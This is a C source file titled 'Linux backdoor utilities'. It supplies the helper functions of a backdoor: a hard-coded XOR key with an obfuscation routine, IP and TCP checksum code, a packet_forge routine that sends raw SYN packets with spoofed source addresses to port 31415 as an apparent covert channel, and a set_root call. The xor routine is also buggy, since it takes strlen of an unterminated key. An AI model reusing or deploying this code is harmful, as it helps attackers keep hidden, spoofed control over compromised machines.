/*-----------------------------------------------------------------------------
 * utils.c - Linux backdoor utilities
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "utils.h"

/* salt used for encryption */
unsigned char xor_salt[] = {
	174, 3  , 202, 53 , 171, 193, 46 , 26 , 
	99 , 59 , 191, 238, 58 , 16 , 107, 216, 
	183, 248, 87 , 122, 213, 242, 66 , 98 , 
	202, 51 , 65 , 57 , 2  , 104, 104, 152, 
	15 , 254, 209, 37 , 114, 249, 148, 128, 
	152, 71 , 123, 52 , 68 , 130, 164, 45 , 
	71 , 8  , 14 , 198, 183, 174, 227, 100, 
	254, 101, 104, 179, 172, 94 , 207, 73 , 
	198, 240, 47 , 252, 139, 124, 222, 112, 
	204, 48 , 54 , 128, 196, 11 , 124, 27 , 
	23 , 109, 108, 151, 41 , 38 , 130, 155, 
	66 , 99 , 16 , 214, 180, 36 , 124, 176, 
	146, 125, 107, 58 , 202, 220, 143, 101, 
	69 , 23 , 53 , 239, 58 , 141, 246, 167, 
	211, 249, 5  , 176, 65 , 231, 203, 153, 
	29 , 41 , 111, 55 , 100, 40 , 187, 91 , 
	169, 215, 35 , 185, 54 , 186, 234, 40 , 
	103, 247, 126, 209, 169, 79 , 199, 213, 
	217, 162, 98 , 134, 187, 35 , 224, 137, 
	37 , 161, 55 , 190, 64 , 80 , 112, 168, 
	198, 173, 195, 14 , 232, 40 , 60 , 136, 
	232, 82 , 90 , 105, 160, 231, 167, 128, 
	242, 239, 104, 107, 100, 14 , 230, 174, 
	169, 176, 142, 254, 2  , 225, 203, 76 , 
	237, 50 , 131, 70 , 20 , 41 , 97 , 133, 
	34 , 188, 32 , 17 , 192, 249, 20 , 146, 
	133, 193, 49 , 17 , 199, 204, 250, 56 , 
	33 , 222, 120, 69 , 150, 208, 39 , 79 , 
	56 , 46 , 95 , 158, 255, 189, 80 , 255, 
	74 , 27 , 156, 94 , 91 , 92 , 155, 32 , 
	240, 236, 24 , 233, 167, 34 , 49 , 79 , 
	181, 124, 9  , 51 , 170, 151, 164, 151, 
	81 , 22 , 112, 7  , 220, 12 , 227, 194, 
	186, 206, 63 , 135, 137, 10 , 124, 228, 
	13 , 24 , 181, 193, 87 , 65 , 231, 7  , 
	10 , 214, 32 , 16 , 17 , 121, 242, 2  , 
	54 , 119, 117, 128, 222, 185, 209, 59 , 
	149, 107, 51 , 141, 9  , 181, 170, 202, 
	69 , 119, 130, 17 , 65 , 25 , 233, 16 , 
	147, 212, 242, 185, 152, 207, 65 , 56 , 
	177, 232, 85 , 186, 198, 50 , 156, 147, 
	220, 248, 179, 65 , 213, 238, 211, 174, 
	164, 45 , 130, 102, 66 , 85 , 92 , 54 , 
	213, 90 , 128, 186, 254, 227, 11 , 171, 
	233, 114, 77 , 228, 85 , 182, 149, 172, 
	211, 46 , 48 , 96 , 214, 193, 0  , 51 , 
	130, 56 , 119, 35 , 25 , 54 , 131, 248, 
	62 , 187, 186, 134, 149, 80 , 190, 7  , 
	226, 219, 250, 82 , 38 , 241, 150, 43 , 
	229, 78 , 88 , 30 , 32 , 97 , 131, 43 , 
	5  , 35 , 55 , 91 , 236, 240, 165, 66 , 
	70 , 111, 119, 233, 201, 212, 213, 146, 
	202, 156, 58 , 49 , 118, 45 , 253, 114, 
	207, 87 , 120, 251, 162, 5  , 195, 134, 
	191, 181, 54 , 153, 36 , 159, 152, 194, 
	190, 124, 129, 203, 186, 150, 141, 134, 
	100, 212, 195, 137, 138, 57 , 186, 13 , 
	252, 121, 252, 252, 41 , 145, 225, 177, 
	29 , 31 , 190, 191, 188, 98 , 33 , 107, 
	111, 189, 34 , 218, 213, 198, 74 , 185, 
	164, 213, 237, 151, 192, 54 , 171, 135, 
	20 , 76 , 135, 37 , 181, 113, 209, 102, 
	218, 20 , 222, 15 , 93 , 232, 243, 210, 
	96 , 86 , 2  , 153, 33 , 249, 153, 103, 
	131, 100, 206, 28 , 179, 78 , 149, 0  , 
	80 , 120, 222, 24 , 95 , 149, 127, 102, 
	174, 203, 1  , 234, 177, 48 , 104, 69 , 
	173, 75 , 184, 125, 61 , 83 , 33 , 30 , 
	117, 240, 99 , 108, 123, 97 , 144, 21 , 
	226, 90 , 43 , 38 , 250, 40 , 240, 157, 
	118, 1  , 135, 219, 178, 219, 180, 157, 
	225, 198, 230, 56 , 218, 122, 30 , 67 , 
	200, 34 , 172, 124, 1  , 148, 168, 236, 
	103, 13 , 250, 95 , 10 , 79 , 49 , 169, 
	22 , 110, 252, 143, 122, 170, 127, 195, 
	99 , 72 , 175, 97 , 48 , 87 , 168, 195, 
	15 , 202, 123, 64 , 195, 75 , 181, 239, 
	128, 73 , 238, 153, 49 , 136, 100, 21 , 
	33 , 64 , 6  , 201, 60 , 84 , 176, 159, 
	126, 140, 136, 97 , 151, 149, 171, 230, 
	215, 226, 183, 197, 135, 78 , 134, 180, 
	122, 227, 27 , 23 , 1  , 146, 177, 196, 
	135, 133, 79 , 117, 57 , 251, 252, 73 , 
	222, 13 , 4  , 141, 116, 91 , 86 , 184, 
	107, 69 , 11 , 98 , 252, 132, 207, 232, 
	34 , 19 , 180, 98 , 235, 238, 28 , 80 , 
	107, 179, 106, 9  , 141, 14 , 130, 209, 
	82 , 149, 16 , 122, 156, 241, 90 , 217, 
	141, 156, 229, 12 , 16 , 184, 243, 20 , 
	115, 108, 252, 123, 193, 45 , 133, 248, 
	191, 169, 138, 221, 250, 183, 233, 56 , 
	116, 233, 15 , 249, 179, 214, 143, 189, 
	118, 148, 90 , 190, 103, 190, 138, 213, 
	199, 12 , 52 , 118, 218, 161, 159, 36 , 
	51 , 211, 184, 85 , 147, 177, 180, 127, 
	181, 28 , 81 , 63 , 149, 64 , 210, 16 , 
	160, 210, 176, 51 , 167, 62 , 123, 137, 
	63 , 111, 99 , 154, 171, 217, 170, 64 , 
	219, 118, 38 , 43 , 104, 194, 97 , 67 , 
	183, 97 , 78 , 57 , 111, 182, 218, 173, 
	51 , 146, 47 , 28 , 52 , 139, 95 , 162, 
	117, 249, 117, 51 , 48 , 251, 59 , 117, 
	127, 100, 86 , 65 , 31 , 11 , 137, 85 , 
	62 , 2  , 38 , 49 , 132, 153, 77 , 245, 
	153, 120, 170, 244, 120, 195, 172, 37 , 
	13 , 21 , 33 , 41 , 148, 38 , 187, 93 , 
	236, 141, 44 , 31 , 138, 127, 135, 172, 
	21 , 101, 109, 236, 149, 254, 21 , 30 , 
	110, 12 , 214, 246, 234, 14 , 78 , 3  , 
	184, 70 , 32 , 139, 153, 134, 60 , 158, 
	154, 51 , 54 , 244, 208, 184, 142, 59 , 
	53 , 77 , 200, 252, 242, 57 , 175, 146, 
	23 , 155, 76 , 246, 87 , 254, 143, 32 , 
	75 , 12 , 123, 103, 39 , 28 , 226, 100, 
	12 , 101, 218, 147, 77 , 43 , 146, 202, 
	109, 163, 71 , 103, 249, 253, 40 , 122, 
	173, 177, 10 , 236, 189, 65 , 253, 104, 
	249, 72 , 128, 166, 227, 71 , 6  , 90 , 
	28 , 127, 24 , 46 , 125, 88 , 51 , 29 , 
	156, 208, 64 , 117, 147, 215, 150, 82 , 
	69 , 21 , 28 , 40 , 209, 24 , 239, 89 , 
	35 , 132, 115, 194, 148, 161, 201, 99 , 
	199, 19 , 59 , 1  , 73 , 155, 130, 118, 
	216, 47 , 104, 132, 129, 40 , 155, 223, 
	72 , 44 , 204, 154, 206, 171, 32 , 85 , 
	205, 250, 14 , 85 , 103, 14 , 33 , 65 , 
	230, 180, 170, 183, 151, 118, 115, 223, 
	74 , 83 , 135, 97 , 181, 221, 125, 97 , 
	166, 195, 193, 63 , 22 , 213, 97 , 135, 
	90 , 199, 187, 103, 74 , 212, 29 , 167, 
	72 , 213, 5  , 98 , 180, 159, 155, 138, 
	8  , 61 , 77 , 46 , 123, 142, 136, 182, 
	248, 251, 135, 111, 134, 47 , 11 , 26 , 
	45 , 240, 255, 76 , 193, 106, 189, 188, 
	112, 15 , 103, 225, 163, 244, 218, 107, 
	232, 104, 139, 101, 197, 19 , 47 , 85 , 
	41 , 157, 65 , 191, 70 , 78 , 83 , 78 , 
	98 , 204, 174, 46 , 91 , 212, 131, 34 , 
	214, 25 , 101, 101, 101, 28 , 125, 42 , 
	244, 11 , 47 , 186, 17 , 247, 55 , 10 , 
	153, 185, 65 , 94 , 91 , 165, 168, 211, 
	113, 135, 175, 52 , 122, 106, 170, 22 , 
	82 , 89 , 221, 45 , 219, 142, 215, 155, 
	204, 45 , 1  , 250, 180, 59 , 228, 77 , 
	119, 106, 133, 169, 17 , 249, 172, 180, 
	53 , 122, 184, 108, 254, 175, 124, 85 , 
	157, 78 , 22 , 43 , 94 , 28 , 245, 190, 
	137, 11 , 233, 237, 48 , 169, 138, 69 , 
	98 , 200, 106, 71 , 242, 195, 0  , 122, 
	5  , 212, 172, 194, 209, 172, 17 , 151, 
	97 , 128, 70 , 196, 166, 114, 192, 1  , 
	135, 242, 241, 217, 19 , 150, 145, 184, 
	225, 111, 25 , 109, 96 , 246, 7  , 224, 
	57 , 119, 19 , 13 , 107, 142, 130, 28 , 
	115, 44 , 3  , 79 , 145, 130, 24 , 87 , 
	223, 152, 70 , 23 , 167, 107, 179, 59 , 
	135, 170, 112, 130, 226, 0  , 49 , 216, 
	246, 205, 94 , 183, 219, 179, 184, 47 , 
	137, 153, 47 , 138, 190, 137, 5  , 253, 
	60 , 64 , 180, 63 , 40 , 192, 176, 70 , 
	180, 3  , 245, 15 , 91 , 15 , 171, 199, 
	38 , 38 , 66 , 219, 179, 27 , 33 , 135, 
	230, 79 , 255, 44 , 212, 242, 124, 32 , 
	245, 192, 206, 195, 156, 4  , 43 , 91 , 
	227, 214, 129, 110, 156, 222, 197, 216, 
	181, 122, 163, 140, 221, 81 , 188, 228, 
	58 , 47 , 46 , 62 , 168, 174, 104, 171, 
	128, 49 , 120, 135, 217, 67 , 214, 253, 
	23 , 33 , 60 , 170, 43 , 96 , 101, 183, 
	104, 246, 31 , 177, 169, 9  , 82 , 61 , 
	43 , 84 , 210, 178, 55 , 64 , 149, 212, 
	160, 74 , 233, 110, 207, 9  , 170, 108, 
	107, 74 , 83 , 0  , 212, 15 , 237, 32 , 
	139, 24 , 69 , 237, 225, 68 , 156, 171, 
	53 , 202, 105, 183, 238, 145, 222, 171, 
	247, 11 , 216, 58 , 34 , 135, 11 , 164, 
	110, 111, 253, 147, 196, 6  , 47 , 21 , 
	72 , 4  , 68 , 25 , 43 , 40 , 230, 19 , 
	40 , 169, 110, 105, 9  , 106, 163, 153, 
	214, 211, 94 , 49 , 83 , 3  , 80 , 83 , 
	0  , 24 , 149, 90 , 211, 188, 212, 84 , 
	49 , 212, 228, 137, 143, 156, 251, 101, 
	211, 225, 118, 186, 37 , 145, 229, 15 , 
	250, 111, 30 , 108, 69 , 73 , 142, 29 , 
	61 , 173, 251, 117, 67 , 143, 96 , 29 , 
	15 , 213, 124, 196, 18 , 74 , 51 , 26 , 
	178, 55 , 116, 253, 128, 137, 164, 230, 
	79 , 160, 157, 132, 158, 163, 30 , 30 , 
	172, 115, 86 , 40 , 10 , 15 , 28 , 149, 
	102, 253, 208, 51 , 49 , 9  , 231, 42 , 
	98 , 33 , 51 , 16 , 250, 92 , 95 , 215, 
	255, 80 , 183, 92 , 198, 138, 138, 106, 
};

/*-----------------------------------------------------------------------------
 * FUNCTION:    in_cksum
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    W. Richard Stevens (From UNIX Network Programming)
 * 
 * PROGRAMMER:  W. Richard Stevens (From UNIX Network Programming)
 * 
 * INTERFACE:   in_cksum(unsigned short *addr, int len)
 *                     addr - the IP to be checksummed
 *                     len - lengh of the header
 * 
 * RETURNS:     A checksum on the IP header.
 * 
 * NOTES: Creates a valid checksum for an IP header.
 *
 *----------------------------------------------------------------------------*/
unsigned short in_cksum(unsigned short *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	/* Our algorithm is simple, using a 32-bit accumulator (sum), we add
	 * sequential 16-bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nleft ==1) {
		*(unsigned char *)(&answer) = *(unsigned char *)w;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add high 16 to low 16 */
	sum += (sum >> 16);					/* add carry */
	answer = ~sum;						/* truncate to 16 bits */

	return (answer);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    in_cksum_tcp
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Murat Balaban <murat@enderunix.org>
 * 
 * PROGRAMMER:  Murat Balaban <murat@enderunix.org>
 * 
 * INTERFACE:   in_cksum_tcp(int src, int dst, unsigned short *addr, int len)
 *                   src - source IP address
 *                   dst - destination IP address
 *                   addr - TCP header
 *                   len - length of TCP header
 * 
 * RETURNS:     Valid checksum on TCP header
 * 
 * NOTES: Creates a valid TCP checksum.
 *
 *----------------------------------------------------------------------------*/
unsigned short in_cksum_tcp(int src, int dst, unsigned short *addr, int len)
{
	struct pseudo_hdr {
		struct in_addr src;
		struct in_addr dst;
		unsigned char pad;
		unsigned char proto;
		unsigned short tcp_len;
		struct tcphdr tcp;
	} pseudo_hdr;

	unsigned short answer;

	memset(&pseudo_hdr, 0, sizeof(pseudo_hdr));

	pseudo_hdr.src.s_addr = src;
	pseudo_hdr.dst.s_addr = dst;
	pseudo_hdr.pad = 0;
	pseudo_hdr.proto = IPPROTO_TCP;
	pseudo_hdr.tcp_len = htons(len);

	memcpy(&(pseudo_hdr.tcp), addr, len);

	answer = in_cksum((unsigned short *)&pseudo_hdr, 12 + len);

	return (answer);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    xor
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   xor(char *string)
 *                  string - the string to be XOR'd with xor_salt
 * 
 * RETURNS:     XOR'd string against xor_salt
 * 
 * NOTES: Simple encryption routine that uses XOR against xor_salt.
 *
 *----------------------------------------------------------------------------*/
char *xor(char *string)
{
	char *answer;
	int i, len;

	len = strlen(string);

	/* allocate adequite memory */
	answer = (char *)malloc(len);

	/* decrypt by XOR_SALT */
	for (i = 0; i < len; i++) {
		answer[i] = string[i] ^ xor_salt[(i % strlen((const char *)xor_salt))];
		/* answer[i] = string[i]; */
	}

	return answer;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    packet_forge
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   packet_forge(char *payload)
 *                    payload - the data being sent
 * 
 * RETURNS:     void
 * 
 * NOTES: Sends data over a raw socket.
 *
 *----------------------------------------------------------------------------*/
void packet_forge(char *payload, char *src, char *dst)
{
	struct ip iph;
	struct tcphdr tcph;
	struct sockaddr_in sin;
	struct timeval time;
	unsigned char *packet;
	const int on = 1;
	int sock_fd, send_len;

	/* seed random number generator */
	gettimeofday(&time, NULL);
	srand(time.tv_usec);

	/* allocate memory for the packet */
	packet = (unsigned char *)malloc(40 + strlen(payload));

	/* create a forged IP header */
	iph.ip_hl	= 0x5;
	iph.ip_v	= 0x4;
	iph.ip_tos	= 0x0;
	iph.ip_len	= sizeof(struct ip) + sizeof(struct tcphdr) + strlen(payload);
	iph.ip_id	= htonl((int)(255.0 * rand() / (RAND_MAX + 1.0)));
	iph.ip_off	= 0x0;
	iph.ip_ttl	= 0x64;
	iph.ip_sum	= 0;
	iph.ip_p	= IPPROTO_TCP;
	iph.ip_src.s_addr = inet_addr(src);
	iph.ip_dst.s_addr = inet_addr(dst);

	/* create a forged TCP header */
	tcph.th_sport = htons(1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0)));
	tcph.th_dport = htons(31415);
	tcph.th_seq = htonl(1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0)));
	tcph.th_off = sizeof(struct tcphdr) / 4;
	tcph.th_flags = TH_SYN;
	tcph.th_win = htons(65535);
	tcph.th_sum = 0;

	/* combine the forged headers into a socket struct */
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = iph.ip_dst.s_addr;

	/* open raw socket for sending */
	if ((sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < ERROR_NONE) {
		err(1, "socket");
		exit(ERROR_SOCKET);
	}

	if (setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < ERROR_NONE) {
		err(1, "setsockopt");
		exit(ERROR_SOCKET);
	}	

	/* create checksums */
	iph.ip_sum = in_cksum((unsigned short*)&iph, sizeof(iph));
	tcph.th_sum = in_cksum_tcp(iph.ip_src.s_addr, iph.ip_dst.s_addr,
			(unsigned short *)&tcph, sizeof(tcph));

	/* finish full header */
	memcpy(packet, &iph, sizeof(iph));
	memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
	memcpy(packet + sizeof(iph) + sizeof(tcph), payload, strlen(payload));

	/* send the packet */
	if ((send_len = sendto(sock_fd, packet, iph.ip_len, 0,
					(struct sockaddr *)&sin,
					sizeof(struct sockaddr))) < ERROR_NONE) {
		err(1, "sendto");
		exit(ERROR_SEND);
	}

	close(sock_fd);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    set_root
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   set_root(void)
 * 
 * RETURNS:     void
 * 
 * NOTES: Sets the UID/GID to root
 *
 *----------------------------------------------------------------------------*/
int set_root()
{
	/* change the UID/GIT to 0 (root) */
	if (setuid(0) != ERROR_NONE || setgid(0) != ERROR_NONE)
		return ERROR_NOTROOT;

	return ERROR_NONE;
}
